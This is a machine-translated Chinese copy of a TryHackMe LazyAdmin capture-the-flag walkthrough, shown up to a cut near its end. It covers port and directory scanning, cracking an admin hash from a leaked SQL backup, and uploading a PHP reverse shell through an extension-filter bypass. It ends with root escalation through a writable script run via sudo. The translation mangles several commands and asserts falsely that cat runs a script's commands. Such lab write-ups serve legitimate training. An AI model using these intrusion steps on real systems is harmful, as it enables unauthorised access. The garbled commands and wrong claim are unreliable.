<html>
<head>
<title>TryHackMe- LazyAdmin CTF Writeup (Detailed)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe- LazyAdmin CTF报道(详细)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-lazyadmin-ctf-writeup-detailed-68cee0ef826?source=collection_archive---------0-----------------------#2020-09-22">https://infosecwriteups.com/tryhackme-lazyadmin-ctf-writeup-detailed-68cee0ef826?source=collection_archive---------0-----------------------#2020-09-22</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/d3303356ae8149cca9bc3cb3ba98bf6b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*C8NUo7UWtuxU_qO0YSL2MQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">CTF报道#3</figcaption></figure><p id="7809" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">欢迎各位！我们将乘坐地铁去CTF。我希望你会喜欢这篇文章。有两种方法我们会得到根。继续读下去，你会在末尾找到它们。</p><div class="la lb gp gr lc ld"><a href="https://tryhackme.com/room/lazyadmin" rel="noopener  ugc nofollow" target="_blank"><div class="le ab fo"><div class="lf ab lg cl cj lh"><h2 class="bd ir gy z fp li fr fs lj fu fw ip bi translated">TryHackMe | LazyAdmin</h2><div class="lk l"><h3 class="bd b gy z fp li fr fs lj fu fw dk translated">TryHackMe是一个学习和教授网络安全的在线平台，全部通过您的浏览器完成。</h3></div><div class="ll l"><p class="bd b dl z fp li fr fs lj fu fw dk translated">tryhackme.com</p></div></div><div class="lm l"><div class="ln l lo lp lq lm lr jw ld"/></div></div></a></div><p id="8899" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">让我们开始吧！！享受流动吧！！</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ls"><img src="../Images/73ec7a65711f2173429f0512269067ad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yQnvOMFPLGL2QrAn_pYVuw.png"/></div></div></figure><p id="6202" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">部署机器。</strong> <br/>与此同时，当你等待机器被部署时，我要你在桌面上快速创建一个CTF目录，并在CTF目录中创建一个nmap目录。</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi lx"><img src="../Images/27b2a3ecd60173905d41ae9bd9cde249.png" data-original-src="https://miro.medium.com/v2/resize:fit:1118/format:webp/1*Scp2mA_HMTCs-UPwDUYSVg.png"/></div></figure><p id="d735" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir"> Nmap扫描:</strong></p><blockquote class="ly lz ma"><p id="1e74" class="kc kd mb ke b kf kg kh ki kj kk kl km mc ko kp kq md ks kt ku me kw kx ky kz ij bi translated"><em class="iq">nmap-sC-sV-oN nmap/root me&lt;MACHINE _ IP&gt;T7】</em></p></blockquote><ul class=""><li id="3d58" class="mf mg iq ke b kf kg kj kk kn mh kr mi kv mj kz mk ml mm mn bi translated">-sC:默认脚本</li><li id="7df1" class="mf mg iq ke b kf mo kj mp kn mq kr mr kv ms kz mk ml mm mn bi translated">-sV:版本检测</li><li id="9621" class="mf mg iq ke b kf mo kj mp kn mq kr mr kv ms kz mk ml mm mn bi translated">-oN:输出将存储在您之前创建的目录“nmap”中</li></ul><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mt"><img src="../Images/46656b8edf708024a6c68481ac97430e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kDWInlDuer2pXYgKdyLyJg.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">Nmap扫描输出</figcaption></figure><p id="4796" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">盒子上开了2个端口:<br/>22/ssh-OpenSSH 7.2p 2<br/>80/http-Apache/2 . 4 . 18<br/>检测到OS-Linux</p><p id="c5f0" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">因为端口80是打开的，所以让我们导航到URL http:// <target_ip/></p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mu"><img src="../Images/7152d1bfc88fd6a14ec5171fa3185763.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vStTRl04qwKOU6U3MPzoZw.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">Apache默认页面</figcaption></figure><p id="dcb8" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们可以尝试通过gobuster找到URL上隐藏的目录。</p><blockquote class="ly lz ma"><p id="5e16" class="kc kd mb ke b kf kg kh ki kj kk kl km mc ko kp kq md ks kt ku me kw kx ky kz ij bi translated">gobuster dir-u http://<machine_ip>-w<path_to_wordlist/></machine_ip></p></blockquote><ul class=""><li id="6f74" class="mf mg iq ke b kf kg kj kk kn mh kr mi kv mj kz mk ml mm mn bi translated">-u : URL</li><li id="7af5" class="mf mg iq ke b kf mo kj mp kn mq kr mr kv ms kz mk ml mm mn bi translated">-w:单词表</li></ul><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mv"><img src="../Images/92ceaabfffc84f4e48d71d7a5275ff44.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ByMQzWR6xc92HQdxO49fVw.png"/></div></div></figure><p id="7188" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">您可以在gobuster中使用更多标志:</p><ul class=""><li id="5a52" class="mf mg iq ke b kf kg kj kk kn mh kr mi kv mj kz mk ml mm mn bi translated">-问:安静，无声扫描。将隐藏横幅。</li><li id="4504" class="mf mg iq ke b kf mo kj mp kn mq kr mr kv ms kz mk ml mm mn bi translated">-o:要存储在目录中的输出</li><li id="105c" class="mf mg iq ke b kf mo kj mp kn mq kr mr kv ms kz mk ml mm mn bi translated">-x:搜索扩展名，如html、txt、php、phtml等。</li></ul><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mw"><img src="../Images/31d70367e56fc9b5235a9fd0aeefef07.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SBbnOpHKG4qzGQniHUFCaA.png"/></div></div></figure><p id="5e75" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">gobuster <machine_ip> /content只找到1个目录。可能会很有趣。事不宜迟，让我们导航到目录，并寻找任何可以帮助我们枚举过程的信息。</machine_ip></p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mx"><img src="../Images/e2287815f235e69c53d6789016c8ee5f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*v9sqUeyRDfsefx_jMVpKDA.png"/></div></div></figure><p id="771d" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">此外，我们可以做的是再次使用gobuster工具，在我们已经找到“内容”的目录中找到隐藏的目录</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi my"><img src="../Images/a7511e4824fe90d00ff6aa906d183d9e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4kwaY_lw6rQAFL0dPaMKYQ.png"/></div></div></figure><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mz"><img src="../Images/a76e32513bebed676fa2e6cf751dbd26.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rCDv0YIT1iBwKIC3DLoJQw.png"/></div></div></figure><p id="fac9" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">令人惊讶的是，我们有一堆文件夹要检查。它们会导致任何事情。</p><p id="caab" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">逐个导航到目录。从我们发现的第一个开始。</p><p id="110e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><target_ip>/内容/图片</target_ip></p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi na"><img src="../Images/81fada950a9ff1d1b3f7bcc173817081.png" data-original-src="https://miro.medium.com/v2/resize:fit:1340/format:webp/1*XIXPlKsp8GJbeUq-i-E_WQ.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">没有什么能引起我的注意，或者看起来非常有趣。</figcaption></figure><p id="5bbf" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><target_ip>/内容/js</target_ip></p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/83a2d3c76d732348f047466710e76e03.png" data-original-src="https://miro.medium.com/v2/resize:fit:1146/format:webp/1*oYBPZzfMYzdclpayQa8byA.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">没有什么能引起我的注意，或者看起来非常有趣。</figcaption></figure><p id="a511" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><target_ip> /content/inc/</target_ip></p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi nc"><img src="../Images/765616a33a3ba51f78f4918c2f9e9c74.png" data-original-src="https://miro.medium.com/v2/resize:fit:992/format:webp/1*tRyNx02nVDUWXEpG9rNNXQ.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">有意思……</figcaption></figure><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi nd"><img src="../Images/977919bcac17fdafe7a581495acd6e38.png" data-original-src="https://miro.medium.com/v2/resize:fit:1240/format:webp/1*In3qE1iT_IKo3_h36OD23g.png"/></div></figure><p id="1857" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">很可爱。我们有一个mysql备份文件。那可能对我们有帮助。让我们把它下载到我们的系统。</p><p id="9889" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">让我们继续其他目录并探索它们。</p><p id="71c3" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><target_ip>/内容/as/</target_ip></p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ne"><img src="../Images/fdf985b6707cbf8568942537ab43ae97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-Hsj-SKrtvVT7C_D1YCuLg.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">厉害！！登录页面！！</figcaption></figure><p id="03d9" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">到目前为止很棒！！还要检查页面的源代码，看看是否有任何隐藏的白色文本或对我们有用的注释。已经看过了，没什么特别的。</p><p id="e3f3" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">快速导航到其他目录。</p><p id="a66b" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><target_ip> /content/_themes/</target_ip></p><p id="a192" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><target_ip>/内容/附件/</target_ip></p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/7a85ad4981e41135decdaab6475a8c39.png" data-original-src="https://miro.medium.com/v2/resize:fit:1214/format:webp/1*LsgbJt0-fJEn6qgbVUvCxg.png"/></div></figure><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/c7886fcdb240f0bd15ea9498efa8a25e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1210/format:webp/1*BPRdN9p0GWF2iF-9OjOPgg.png"/></div></figure><p id="de75" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">“_themes”和“attachments”目录中没有任何内容。</p><p id="3ec8" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">综上所述，到目前为止我们所得到的只是一个对提取信息有潜在重要性的文件。那就是:MySQL-bakup _ 20191129023059–1 . 5 . 1 . SQL</p><p id="3f8f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">2019 —年<br/> 11 —月<br/> 29 —日<br/> 02 —小时<br/> 30 —分钟<br/> 59 —秒<br/> 1.5.1 —网站使用的CMS版本。在这个盒子里，甜心。</p><p id="1b41" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们可以使用“cat”来检查备份文件。也许那里有我们需要寻找的东西。保持警惕。从上到下开始分析。</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/047ab4808999542cc10f095f03365e1e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1284/format:webp/1*uhlam8XK6ikUJgpPXxm4sA.png"/></div></figure><p id="8824" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">霍雷。我发现了一些东西。仔细看。向下滚动，你可能会看到它..</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ni"><img src="../Images/f082c638825c32f23ac4a70c5eedd143.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RGPZSDHCORFesdjsuk6fnA.png"/></div></div></figure><p id="68ec" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">管理员:经理<br/>密码:42f 749 ade 7 F9 e 195 BF 475 f 37 a 44 cafcb</p><p id="7786" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">很明显，密码是散列形式的。我们来解密一下。</p><p id="13d2" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">去crack station/cyber chef/hash-identifier分析hash /开膛手约翰。太多了，无法选择。我会去crackstation解密哈希。</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nj"><img src="../Images/66e5ca8576c46bbc05bea52c44f69b4b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GptKogSSV2sC6aL4uXa_dw.png"/></div></div></figure><p id="ccaf" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">！！太棒了！！我们已经解密了密码！！</p><p id="739c" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们可以尝试用我们拥有的凭证登录到<target_ip> /content/as/ login页面。</target_ip></p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/cb1a8ef483d6115ed025b7247d0d2d64.png" data-original-src="https://miro.medium.com/v2/resize:fit:1018/format:webp/1*CuJ5vfgzEqkmtyEYmyqJVQ.png"/></div></figure><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nl"><img src="../Images/dc0d3a9f65794e1c8048c89304cd73e7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tp8HB9086ub_jBw9yeMPyg.png"/></div></div></figure><p id="34ba" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们进去了。！现在我们要做什么？首先，浏览网站，找到可以上传脚本的地方。我发现了几个页面，我们可以在那里创建一个新的帖子或插件列表页面。我们将创建一个新帖子并上传一个php-reverse-shell.php</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nm"><img src="../Images/8a937eba90b34ad63db83bc215058f4d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*54XHLuFJHe5b5wRyXhTsIg.png"/></div></div></figure><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/235df4e9d7edce37c5b7500997374c38.png" data-original-src="https://miro.medium.com/v2/resize:fit:610/format:webp/1*2485VcRKLf0QgAFXfS4Ocg.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">在底部滚动以找到按钮附件</figcaption></figure><p id="09ce" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">对于这项任务，我们将上传php反向外壳脚本。<br/>我经常使用pentest monkey php-reverse-shell.php脚本，试图通过netcat获得一个反向外壳。【https://github.com/pentestmonkey/php-reverse-shell】Git链接下载脚本或在终端克隆:<a class="ae no" href="https://github.com/pentestmonkey/php-reverse-shell" rel="noopener ugc nofollow" target="_blank">T6】</a></p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi np"><img src="../Images/253c7d68d21172930aad674b5d91affb.png" data-original-src="https://miro.medium.com/v2/resize:fit:636/format:webp/1*yTzyNUVnaZInrlcl7ZTbPQ.png"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">将IP更改为您的主机IP，将端口更改为您想要监听的主机端口</figcaption></figure><p id="00d3" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我已经配置了脚本，现在我们将上传脚本。</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nq"><img src="../Images/2a40d4b851d3d9cc707d05008ea20c1a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*spMxtxJVJ85_4TMHZ-_DPQ.png"/></div></div></figure><p id="cee2" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们现在需要在netcat上启动一个监听器，并尝试获得一个shell。手指交叉。</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi nr"><img src="../Images/4ba45808c67d551ee4a6cb62f803e909.png" data-original-src="https://miro.medium.com/v2/resize:fit:1154/format:webp/1*armmFviUwBvbIxYt-2C1rA.png"/></div></figure><p id="961c" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们需要执行上传的脚本。</p><p id="e52f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">还记得之前我们在gobuster中发现一个目录实际上是空的，但现在不会了。或许是吧。让我们找出答案。</p><p id="2cc5" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><machine_ip>/内容/附件</machine_ip></p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/701e020d9869beac539b79ab90513934.png" data-original-src="https://miro.medium.com/v2/resize:fit:1204/format:webp/1*fso41HZgr4DLvBg7pHXuEg.png"/></div></figure><p id="e62b" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">这是空的！！！但是为什么呢？这是因为。php扩展正在被过滤，不允许上传，因此我们必须通过将脚本重命名为不受欢迎的扩展来绕过上传，例如phtml，php5等。</p><blockquote class="ly lz ma"><p id="1fc7" class="kc kd mb ke b kf kg kh ki kj kk kl km mc ko kp kq md ks kt ku me kw kx ky kz ij bi translated">我们需要重命名，所以让我们使用命令:<br/>mv php-reverse-shell.php PHP-reverse-shell . phtml</p></blockquote><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nt"><img src="../Images/4d2e6bd03da3475f6e8a07c62fe60757.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*S9ufAUty6CvU5YEPiAUMjQ.png"/></div></div></figure><p id="c8b7" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">再次重复该过程，并尝试查看它是否绕过上传。</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/720b883dfd8cf5f3bd92bd8f1c356506.png" data-original-src="https://miro.medium.com/v2/resize:fit:1396/format:webp/1*Ujo57X25ThNY9LyciS5bbA.png"/></div></figure><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nv"><img src="../Images/71845eb8d6600100404fb101c9bdedbb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1356/format:webp/1*V7bPVn6vPZtWdhbRjfnDng.png"/></div></div></figure><p id="1be5" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们已成功上传或绕过上传。我们将执行这个脚本，并检查我们的netcat监听器，看看我们是否已经获得了shell。</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nw"><img src="../Images/02a95544dbe7344edb6a5fc0e827b1b3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LJdZKlod6FRgdwszld8JKA.png"/></div></div></figure><p id="bfde" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们成功获得了壳牌。<br/>但是壳不是稳定的壳。<br/>我们如何获得稳定的外壳？让我给你带路。</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi nx"><img src="../Images/7d4c683e899abf848c8a948fcf1e72a0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1266/format:webp/1*GgZX1LLW7FIdBGemyjgzzw.png"/></div></figure><blockquote class="ly lz ma"><p id="a212" class="kc kd mb ke b kf kg kh ki kj kk kl km mc ko kp kq md ks kt ku me kw kx ky kz ij bi translated"><em class="iq">$ python-c ' import pty；pty . spawn("/bin/bash ")'<br/>Ctrl+Z<br/>stty raw-echo<br/>fg<br/>export TERM = xterm</em></p></blockquote><p id="97e4" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们现在有一个稳定的外壳。<br/>上面的命令将让你通过TAB键自动完成，清除屏幕，在shell中轻松导航。</p><p id="6f4f" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">让我们寻找我们的user.txt标志</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ny"><img src="../Images/9fed500bbbe267b2067db2e86342f172.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dP8uIA1vY1cCHhc3DTPtfw.png"/></div></div></figure><blockquote class="ly lz ma"><p id="b952" class="kc kd mb ke b kf kg kh ki kj kk kl km mc ko kp kq md ks kt ku me kw kx ky kz ij bi translated">#1.1 user.txt <br/>回复:xxxxxxxxxxxxxxxxxxxxx</p></blockquote><p id="48aa" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们还需要做什么？是的，你想得对。<br/>我们需要提升我们的权限以成为root用户并获得root.txt标志。</p><blockquote class="ly lz ma"><p id="b6ec" class="kc kd mb ke b kf kg kh ki kj kk kl km mc ko kp kq md ks kt ku me kw kx ky kz ij bi translated">使用命令:sudo -l</p></blockquote><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mt"><img src="../Images/78a65bf86a671d56ef4f8de53429806e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*r7o6pBE6xPClf9uh3AOeYA.png"/></div></div></figure><p id="0584" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们可以看到我们可以使用perl脚本语言，并且有一个备份文件的路径。</p><p id="b2e4" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">导航到/home/itguy目录。<br/>使用“ls -al”查看backup.pl文件的权限。</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi nz"><img src="../Images/26cdb50016456b6cf2637d8f384b71b9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1196/format:webp/1*9_knqpM0ls8rfx_L-e6jwg.png"/></div></figure><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi oa"><img src="../Images/efab7c9a530b3990a1ea1104cbaf76fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1022/format:webp/1*-i-I0EgXzbkjxatb3zXdXw.png"/></div></figure><p id="7908" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">让我们“进入”backup.pl文件以查看其内容。我们能做到吗？</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi ob"><img src="../Images/8e5fbe40d949b3f4da364919108e4a61.png" data-original-src="https://miro.medium.com/v2/resize:fit:904/format:webp/1*bO2DVqs-c4UTSBvuX5OaPA.png"/></div></figure><p id="6347" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">是的，我们可以。/etc/目录中有一个copy.sh脚本，该脚本在我们执行backup.pl文件时运行。</p><p id="f49e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">使用“cat /etc/copy.sh”。当我们“捕捉”一个脚本时，它会执行脚本中的命令。</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div class="gh gi oc"><img src="../Images/de1dc05ada15f8592967d9adbbc8ba15.png" data-original-src="https://miro.medium.com/v2/resize:fit:1084/format:webp/1*MnFAUSztSjGeJ0U0OBMpSA.png"/></div></figure><p id="fbcd" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">这个脚本在做什么？它将/bin/bash复制到/tmp/bash中，并对/tmp/bash文件执行+s(超级用户)权限。</p><p id="e1bb" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">如果您查看/tmp/</p><p id="0d82" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">只需nano /etc/copy.sh <br/>完全删除该命令，只需编写一个小命令:<br/> /tmp/bash -p <br/> Ctrl+O保存，Ctrl+C退出</p><p id="1036" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">重新运行命令<br/>sudo/usr/bin/perl/home/it guy/backup . pl</p><figure class="lt lu lv lw gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi od"><img 